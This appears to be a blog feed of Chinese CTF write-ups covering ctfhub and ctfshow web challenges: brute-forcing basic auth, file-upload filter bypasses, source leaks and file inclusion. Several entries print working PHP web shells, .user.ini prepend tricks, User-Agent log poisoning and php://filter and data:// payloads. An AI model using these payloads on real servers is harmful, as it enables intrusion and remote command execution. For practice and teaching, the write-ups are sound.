src="https://img-blog.csdnimg.cn/img_convert/a8b7d71b0bbf315876434add05a18c7b.png" alt="image-20220315211430647"></p><p>grep</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</span><br></pre></td></tr></table></figure><p>`?c=grep${IFS}%27</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub技能树web刷题</title>
      <link href="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/"/>
      <url>/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ctfhub技能树web刷题</p><span id="more"></span><h1 id="HTTP响应包源代码查看"><a href="#HTTP响应包源代码查看" class="headerlink" title="HTTP响应包源代码查看"></a>HTTP响应包源代码查看</h1><p>游戏题直接查看源代码就能找到flag<img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307192926549.png" alt="image-20220307192926549"></p><h1 id="HTTP基础认证"><a href="#HTTP基础认证" class="headerlink" title="HTTP基础认证"></a>HTTP基础认证</h1><p>点开题目给的click，发现是一个登录界面，显然这里需要用bp爆破</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307193424291.png" alt="image-20220307193424291"></p><p>下载题目附件，使用咯i面给的一个弱密码字典</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307193244819.png" alt="image-20220307193244819"></p><p>抓包之后看到一段编码，经过测试是base64</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307202826658.png" alt="image-20220307202826658">经过base64解码之后看到</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307202917840.png" alt="image-20220307202917840"></p><p>将报文发送到Intruder，点击Add，将basic后面的base64部分添加为payload position</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307203112447.png" alt="image-20220307203112447"></p><p>​    </p><p> 添加admin</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307203205312.png" alt="image-20220307203205312"></p><p>添加base64编码</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307203338486.png" alt="image-20220307203338486"></p><p>取消url编码的勾选，不然=会被转换成%3d</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307203320625.png" alt="image-20220307203320625"></p><p>开始爆破，爆破完成之后，点开Length发现一个长度不一样的，点击查看response，看到了flag</p><h1 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h1><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307204757350.png" alt="image-20220307204757350"></p><p>点击give me the flag，使用bp抓包，发送到repeater，发送即可得到flag</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307204721143.png" alt="image-20220307204721143"></p><h2 id="知识点：HTTP临时重定向"><a href="#知识点：HTTP临时重定向" class="headerlink" title="知识点：HTTP临时重定向"></a>知识点：HTTP临时重定向</h2><p>HTTP重定向：服务器无法处理浏览器发送过来的请求（request），服务器告诉浏览器跳转到可以处理请求的url上。（浏览器会自动访问该url的地址，以至于用户无法分辨是否重新定向了。）</p><p>重定向的3XX说明，Location响应首部包含了内容的新地址或是优选地址的url。</p><h3 id="301和302的状态码"><a href="#301和302的状态码" class="headerlink" title="301和302的状态码"></a>301和302的状态码</h3><p>302用来做临时跳转</p><p>302表示临时性重定向，访问一个url时，被重定向到了另外一个url上。</p><p>302常用于页面跳转，比如未登录的用户访问用户中心，则重定向到登陆页面，访问404页面会重定向到首页。</p><p>301适合永久的重定向</p><p>301比较常用的场景时使用域名跳转到<a href="http://www.baidu.com会跳转到https//www.baidu.com%EF%BC%8C%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%BF%94%E5%9B%9E301%E7%8A%B6%E6%80%81%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AAlocation%EF%BC%8C%E6%8F%90%E7%A4%BA%E6%96%B0%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%B1%E4%BC%9A%E6%8B%BF%E7%9D%80%E8%BF%99%E4%B8%AA%E6%96%B0%E7%9A%84%E5%9C%B0%E5%9D%80%E5%8E%BB%E8%AE%BF%E9%97%AE%E3%80%82">http://www.baidu.com会跳转到https://www.baidu.com，发送请求之后，就会返回301状态码，然后返回一个location，提示新的地址，浏览器就会拿着这个新的地址去访问。</a><br>注意： 301请求是可以缓存的， 即通过看status code，可以发现后面写着from cache。<br>　或者你把你的网页的名称从php修改为了html，这个过程中，也会发生永久重定向。<br>301重定向和302重定向的区别<br>302重定向只是暂时的重定向，搜索引擎会抓取新的内容而保留旧的地址，因为服务器返回302，所以，搜索搜索引擎认为新的网址是暂时的。<br>而301重定向是永久的重定向，搜索引擎在抓取新的内容的同时也将旧的网址替换为了重定向之后的网址。</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>打开题目，看到说只有登录才能得到flag</p><p>首先打开hackerbar，然后点击cookie</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307210821895.png" alt="image-20220307210821895"></p><p>可以看到一个admin=0</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307210855405.png" alt="image-20220307210855405"></p><p>把admin的值改为1，就能得到flag了</p><h1 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h1><p>打开题目，看到了给的提示，直接bp抓包</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307213551548.png" alt="image-20220307213551548"></p><p>把GET改为CTFHUB，然后send，直接得到flag</p><p><img src="/2022/03/07/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6web%E5%88%B7%E9%A2%98/image-20220307213820093.png" alt="image-20220307213820093">**</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow中web151</title>
      <link href="/2022/03/05/ctfshow%E4%B8%ADweb151/"/>
      <url>/2022/03/05/ctfshow%E4%B8%ADweb151/</url>
      
        <content type="html"><![CDATA[<p>web文件上传</p><span id="more"></span><h1 id="151题"><a href="#151题" class="headerlink" title="151题"></a>151题</h1><p>1.看到题目直接上传图片码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b14a685c3d0fb3d5b05e456d5d5173c4.png" alt="image-20220305113122536"></p><p>抓包后修改数据（把png格式改为php）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/628eebd9ba602d43a74570d985fa756e.png" alt="image-20220305113500127"></p><p>然后蚁剑连接<img src="https://img-blog.csdnimg.cn/img_convert/005b52d76974ce1a6dda39de589be8a4.png" alt="image-20220305113359904"></p><p>最后找到flag</p><p>2.可以在一句话木马的后缀改为.png</p><p>抓包之后再改回php</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dbf75ba7fdd7f50dfbb11071e7bf8622.png" alt="image-20220305114519356"></p><p>最后用蚁剑连接</p><p><img src="https://img-blog.csdnimg.cn/img_convert/22f894b628fb986ade70a130429055ef.png" alt="image-20220305114532190"></p><h1 id="152题"><a href="#152题" class="headerlink" title="152题"></a>152题</h1><p>与151题的两种方法一样</p><h1 id="153题"><a href="#153题" class="headerlink" title="153题"></a>153题</h1><p>这一题很容易上传php5及其他类型的文件，但是都不被解析</p><p>尝试上传.user.ini(因为题目要求的是图片形式的，所以必须先改成png或jpg格式）发现上传成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c61e86a98b2bd81e1943d10a226c3110.png" alt="image-20220305115929994"></p><p>然后再上传图片码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3b0a093264463fc2334873f026b9092b.png" alt="image-20220305120153519"></p><p>然后访问/upload/index.php,发现上传的木马已经被解析掉了</p><p><img src="https://img-blog.csdnimg.cn/img_convert/71a0d72b8452748fe3f7a1033a704df2.png" alt="image-20220305120251113"></p><p>接着用蚁剑连接，获得flag</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5e2864d90e332a1ada5d494a797659da.png" alt="image-20220305120401500"></p><h1 id="154题"><a href="#154题" class="headerlink" title="154题"></a>154题</h1><p>前面的解题方法跟153题一样，上传图片码之后把php进行大小写绕过</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2376e2992308c9ef3b0a25edf5fde1ac.png" alt="image-20220310195907614"></p><p>接着查看/upload/index.php看看上传的一句话是不是已经被解析掉了<img src="https://img-blog.csdnimg.cn/img_convert/ddc55bf5742c1f5c3d675562a72dfa06.png" alt="image-20220310200008244"></p><p>然后再连接一下蚁剑就行</p><h1 id="155题"><a href="#155题" class="headerlink" title="155题"></a>155题</h1><p>前面的步骤还是先上传.user.ini文件，然后再上传图片码，试了好几种绕过类型都不行，最后直接把php给删掉了，没想到直接看到了路径，所以这一题是限制了木马文件，直接使用短标签进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/162b2d0bd52fcadc1eeb0e234080d7ef.png" alt="image-20220310201041687"></p><p>在/upload/index.php下能够被解析</p><p>接着用蚁剑连接，得到wp<img src="https://img-blog.csdnimg.cn/img_convert/f4e02b5c285a7f14a9c7f41c7d5a87e2.png" alt="image-20220310201331540"></p><h1 id="156题"><a href="#156题" class="headerlink" title="156题"></a>156题</h1><p>前面的步骤跟上题基本一致</p><p>经测试过滤了[],可以用{}或者()来代替[]</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f5831dd499ea89788d6190979dc017b4.png" alt="image-20220310201845621"></p><p>接着查看在/upload/index.php下是否被解析，然后蚁剑连接即可得到flag</p><h1 id="157题"><a href="#157题" class="headerlink" title="157题"></a>157题</h1><p>先成功上传.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=1.shell.png</span><br></pre></td></tr></table></figure><p>再上传1.shell.png，对比上题，发现过滤了;和{}，所以可以用闭合php标签中的?&gt;来绕过，接着上传一下shell.png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>成功之后直接查看/uoload即可看到flag</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b96dae8583e75832a9314b04d2db9c72.png" alt="image-20220310210256573"></p><h1 id="158题"><a href="#158题" class="headerlink" title="158题"></a>158题</h1><p>方法和步骤跟上一题一样</p><h1 id="159题"><a href="#159题" class="headerlink" title="159题"></a>159题</h1><p>先上传.user.ini文件，然后再抓包，发现这题中连()都过滤了，所以这里就需要用到短标签，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure><p>php会将’‘中的内容当作代码来执行，下面的步骤跟上面的都一样</p><h1 id="160题"><a href="#160题" class="headerlink" title="160题"></a>160题</h1><p>先上传.user.ini</p><p>再上传2.shell.png,内容为<code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code>（log被过滤）</p><p>再修改user-agent<code>&lt;?php eval($_POST[shell]);?&gt;</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cdf4bc4d0176fdc980a0fc8e9861d6f2.png" alt="image-20220311213338925"></p><p>在/upload/index.php下查看上传的一句话木马是否被解析掉</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e0451d6d8ed5a0496f99413027184f49.png" alt="image-20220311213445852"></p><p>接下来蚁剑连接就行</p><p>如果这里直接包含flag的话会出现报错<img src="https://img-blog.csdnimg.cn/img_convert/bb0087072363df3d3be65b712f9e8901.png" alt="image-20220311213632882"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cee46380bd2705be429067eb7d9652d9.png" alt="image-20220311213705836"></p><p>因为include_path的限制</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d2714303aa74fa9ee6f3f814c6102aa3.png" alt="image-20220311213821175"></p><p>前面的题目可以nl ../*是因为像system()；等函数不收include_path或者open_basedir的限制，还有include()不支持正则表达式</p><h1 id="161题"><a href="#161题" class="headerlink" title="161题"></a>161题</h1><p>上传.user.ini.png发现失败了，但是文件又需要上传图片格式本，所以本题需要加一个幻术文件头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure><p>上传文件抓包</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ba7eaffe92415f3a507c2da90c3b8d15.png" alt="image-20220312093607884"></p><p>再上传2.shell.png，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure><p>再修改user-agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/94a5426c1aa408ab36bd039099b95985.png" alt="image-20220312095050364"></p><p>查看在/upload/index.php下是否被解析</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d2e161450af8240f8fedb842b167786b.png" alt="image-20220312095446213"></p><p>接着用蚁剑连接得到flag</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c7fbb73b8bba8bf2af2611485e797344.png" alt="image-20220312095614625"></p><h1 id="162题"><a href="#162题" class="headerlink" title="162题"></a>162题</h1>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow中web1~web20</title>
      <link href="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/"/>
      <url>/2022/03/02/ctfshow%E4%B8%ADweb1-web17/</url>
      
        <content type="html"><![CDATA[<p>ctfshow中web1~web20</p><span id="more"></span><h1 id="web1-源码"><a href="#web1-源码" class="headerlink" title="web1 源码"></a>web1 源码</h1><p>本题考查的是查看源代码，打开题目直接查看源代码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302190909655.png" alt="image-20220302190909655"></p><h1 id="web2-js前台拦截"><a href="#web2-js前台拦截" class="headerlink" title="web2 js前台拦截"></a>web2 js前台拦截</h1><p>本题考查的是js前台拦截</p><p>1.打开页面显示的是无法查看源码，直接打开开发者工具，得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302191314689.png" alt="image-20220302191314689"></p><p>2.也可以直接在url的头部添加<code>view-source:</code>来查看源代码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302191513254.png" alt="image-20220302191513254"></p><p>像这种js前台拦截 === 无效操作</p><h1 id="web3-响应头"><a href="#web3-响应头" class="headerlink" title="web3 响应头"></a>web3 响应头</h1><p>本题考察的是响应头</p><p>打开题目之后先看一下源代码，但是没有发现任何信息</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302192222754.png" alt="image-20220302192222754"></p><p>所以直接bp抓包一下试试，输入指令，得到flag</p><p>也可以直接查看Response中的Headers，得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302192141720.png" alt="image-20220302192141720"></p><h1 id="web4-robots-txt"><a href="#web4-robots-txt" class="headerlink" title="web4 robots.txt"></a>web4 robots.txt</h1><p>本题考查robots.txt，根据提示访问robots.txt,看到了flagishere.txt</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302193157420.png" alt="image-20220302193157420"></p><p>接着直接访问flagishere.txt，得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302193501960.png" alt="image-20220302193501960"></p><h1 id="web5-phps源码泄露"><a href="#web5-phps源码泄露" class="headerlink" title="web5 phps源码泄露"></a>web5 phps源码泄露</h1><p>本题是关于phps源码泄露，根据提示直接访问index.phps</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302193741484.png" alt="image-20220302193741484"></p><p>下载所给文件，通过记事本打开就可以得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302193930414.png" alt="image-20220302193930414"></p><h1 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6 www.zip"></a>web6 <a href="http://www.zip/">www.zip</a></h1><p>根据题目提示输入常见的源码包名字<a href="http://www.zip,下载压缩包/">www.zip,下载压缩包</a></p><p>打开后发现里面有两个文件，直接访问index.php可以看到flag在fl000g.txt里面</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302195029842.png" alt="image-20220302195029842"></p><p>但是提交fl000g.txt里面的flag是错误的</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302195402631.png" alt="image-20220302195402631"></p><p>所以直接在浏览器里面访问fl000g.txt,得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302195551614.png" alt="image-20220302195551614"></p><h1 id="web7-git代码泄露"><a href="#web7-git代码泄露" class="headerlink" title="web7  git代码泄露"></a>web7  git代码泄露</h1><p>根据题目提示直接访问url/.git/index.php</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302201317789.png" alt="image-20220302201317789"></p><h1 id="web8-svn泄露"><a href="#web8-svn泄露" class="headerlink" title="web8 svn泄露"></a>web8 svn泄露</h1><p>根据提示，直接访问url/.svn/,得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302201556393.png" alt="image-20220302201556393"></p><h1 id="web9-vim缓存信息泄露"><a href="#web9-vim缓存信息泄露" class="headerlink" title="web9 vim缓存信息泄露"></a>web9 vim缓存信息泄露</h1><p>根据题目提示，直接访问url/index.php.swp，下载弹出来的文件，用记事本打开，得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302201853087.png" alt="image-20220302201853087"></p><h1 id="web10-cookie"><a href="#web10-cookie" class="headerlink" title="web10 cookie"></a>web10 cookie</h1><p>参考cookie，直接抓包，在请求数据包看到flag,其中{ }通过了url编码，需要通过Unescape解码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302202642735.png" alt="image-20220302202642735"></p><h1 id="web11-域名解析"><a href="#web11-域名解析" class="headerlink" title="web11 域名解析"></a>web11 域名解析</h1><p>根据题目提示发现ctfshow.com隐藏了一条信息，通过常用的域名解析网址<code>dbcha.com</code>找到了TXT中有flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302204313953.png" alt="image-20220302204313953"></p><h1 id="web12-公开信息"><a href="#web12-公开信息" class="headerlink" title="web12 公开信息"></a>web12 公开信息</h1><p>在网页的最下端发现了电话号码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302205043065.png" alt="image-20220302205043065"></p><p>通过访问admin尝试进行管理员账号登录，账号填写admin，密码就是电话号码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302205142667.png" alt="image-20220302205142667"></p><h1 id="web13-技术文档敏感信息"><a href="#web13-技术文档敏感信息" class="headerlink" title="web13 技术文档敏感信息"></a>web13 技术文档敏感信息</h1><p>打开页面，在页面的最下面看到document，访问即可得到一些敏感信息</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302210006958.png" alt="image-20220302210006958"></p><p>进入之后可以看到后台登陆的地址，以及泄露的用户名和密码<br><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302205531881.png"></p><p>通过访问/system1103/login.php,并且用其泄露的信息进行登录</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302205840449.png" alt="image-20220302205840449"></p><p>得到flag<img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302205901953.png" alt="image-20220302205901953"></p><h1 id="web14-editor"><a href="#web14-editor" class="headerlink" title="web14 editor"></a>web14 editor</h1><p>根据题目提示直接访问/editor/</p><h1 id="web15-邮箱泄露"><a href="#web15-邮箱泄露" class="headerlink" title="web15 邮箱泄露"></a>web15 邮箱泄露</h1><p>根据题目提示滑到页面的最底部看到了一个qq邮箱</p><p>访问admin进入后台登录系统，发现下方有忘记密码，点击去看到验证信息<img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302212749629.png" alt="image-20220302212749629"></p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302212835926.png" alt="image-20220302212835926"></p><p>问题是我所在的城市，这时候刚刚看到的邮箱就有用处了，搜索一下此qq，发现是西安人</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302213009651.png" alt="image-20220302213009651"></p><p>发现此时密码已被重置</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302213107582.png" alt="image-20220302213107582"></p><p>登录即可获得flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302213144434.png" alt="image-20220302213144434"></p><h1 id="web16-tz-php"><a href="#web16-tz-php" class="headerlink" title="web16 tz.php"></a>web16 tz.php</h1><p>根据题目提示对于测试用的探针，<code>使用完要及时删除，可能会造成信息泄露</code></p><p>通过提示我们直接访问tz.php</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302213826340.png" alt="image-20220302213826340"></p><p>进一步访问到phpinfo即可获得flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220302214011367.png" alt="image-20220302214011367"></p><h1 id="web17-sql文件泄露"><a href="#web17-sql文件泄露" class="headerlink" title="web17 sql文件泄露"></a>web17 sql文件泄露</h1><p>根据题目提示，在url上加入/backup.sql,会得到一个文件</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303192223676.png" alt="image-20220303192223676"></p><p>打开文件得到源码，里面包含了flag </p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303192335673.png" alt="image-20220303192335673"></p><h1 id="web18-js"><a href="#web18-js" class="headerlink" title="web18 js"></a>web18 js</h1><p>打开题目是游戏题，但是根本得不到那么高的分数，所以打开js文件，查看得到flag的条件</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303193408733.png" alt="image-20220303193110416"></p><p>把这段编码进行Unicode解码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303193515949.png" alt="image-20220303193515949"></p><p>根据提示的谐音访问110.php,得到flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303193613002.png" alt="image-20220303193613002"></p><h1 id="web19-前端密钥"><a href="#web19-前端密钥" class="headerlink" title="web19 前端密钥"></a>web19 前端密钥</h1><p>通过访问源代码，发现了其账号和密码</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303195210703.png" alt="image-20220303195210703"></p><p>通过post传参绕过前端验证获取flag</p><p><img src="/2022/03/02/ctfshow%E4%B8%ADweb1-web17/image-20220303195431636.png" alt="image-20220303195431636"></p><h1 id="web20-mdb文件"><a href="#web20-mdb文件" class="headerlink" title="web20 mdb文件"></a>web20 mdb文件</h1><p>根据题目提示访问路径/db/db.mdb,下载mdb文件</p><p>通过访问db.mdb查找关键词flag，获取最终的flag</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-文件包含78-88</title>
      <link href="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/"/>
      <url>/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/</url>
      
        <content type="html"><![CDATA[<p>记录文件包含题型</p><span id="more"></span><h1 id="78题"><a href="#78题" class="headerlink" title="78题"></a>78题</h1><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220226143635533.png" alt="image-20220226143635533"></p><p>打开题目链接之后，审计代码发现是php伪协议</p><p>直接payload<code>?file=php://filter/convert.base64-encode/resource=flag.php</code><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220226143730981.png" alt="image-20220226143730981"></p><p>发现一串乱码，之后base64解密</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220226144044422.png" alt="image-20220226144044422"></p><p>解码之后得到flag</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220226144002336.png" alt="image-20220226144002336"></p><h1 id="79题"><a href="#79题" class="headerlink" title="79题"></a>79题</h1><p>打开题目链接，考察的是data协议</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220226144307271.png" alt="image-20220226144307271"></p><p>payload输入data协议<code>？file=data:*//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=*</code></p><p><code>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; **&lt;?php** system(&#39;cat flag.php&#39;)</code></p><p>查看源代码，得到flag</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220226144934066.png" alt="image-20220226144934066"></p><h1 id="80题"><a href="#80题" class="headerlink" title="80题"></a>80题</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>查看题目发现php协议和data协议都用不了</p><p>所以猜测本题目是文件日志包含漏洞，先抓包，一般的日志路径为 <code>?file=/var/log/nginx/access.log</code></p><p>GET</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>抓包之后发现User-Agent能写入getshell</p><p><code>&lt;?php echo 123;phpinfo();eval($_POST[0]);?&gt;</code>或者是一句话木马</p><p>返回浏览器发现有回显</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220228210701415.png" alt="image-20220228210701415"></p><p>直接连接蚁剑得到flag</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220228205923133.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>题目过滤了php，data协议</p><p>考虑用日志包含</p><p>GET</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>User-Agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>也可以在此注入一句话木马<code>&lt;?php eval($_post[shell])?&gt;</code></p><p>这个需要多发几次才能显示出来</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220228210823182.png"></p><p>之后再换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img 